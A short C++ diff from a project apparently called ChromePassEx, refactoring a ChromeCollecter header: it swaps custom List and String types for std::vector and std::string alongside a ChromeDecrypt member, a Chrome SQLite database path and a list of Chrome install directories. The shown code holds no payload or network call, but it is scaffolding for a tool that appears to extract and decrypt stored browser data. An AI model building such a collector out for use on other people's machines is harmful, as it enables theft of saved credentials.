@@ -7,7 +7,6 @@
 #include <string>
 #include <vector>
 
-#include "common.h"
 #include "ChromeDecrypt.h"
 #ifdef ChromePassEx_EXPORTS
 
@@ -32,16 +31,16 @@ public:
 
 	 ~ChromeCollecter() = default;
 
-	 virtual List<T> collectData() =0 ;
+	 virtual std::vector<T> collectData() =0 ;
 
 protected:
 
-	virtual void collectFromPath(const String& chromePath) = 0;
-	virtual bool getDbPath(const String& chromePath)=0 ;
-	List<T> m_collectedData;
-	String m_chromeSqlitePath;
+	virtual void collectFromPath(const std::string& chromePath) = 0;
+	virtual bool getDbPath(const std::string& chromePath)=0 ;
+	std::vector<T> m_collectedData;
+	std::string m_chromeSqlitePath;
 	ChromeDecrypt m_decryptor;
-	const List<String> m_chromeList{
+	const std::vector<std::string> m_chromeList{
 
 		"\\Google\\Chrome",
 		"\\Google(x86)\\Chrome",
